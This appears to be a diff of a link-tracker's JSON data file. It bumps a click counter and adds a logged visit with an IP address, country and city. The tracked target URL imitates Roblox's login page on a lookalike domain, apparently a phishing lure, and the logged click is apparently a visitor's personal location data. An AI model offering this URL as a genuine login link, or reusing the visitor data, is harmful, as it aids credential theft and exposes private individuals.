@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1618,
+    "useCount": 1619,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13112,6 +13112,14 @@
         "city": "Chon Buri",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777534616066,
+        "ip": "122.55.231.5",
+        "country": "Philippines",
+        "city": "Caruhatan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
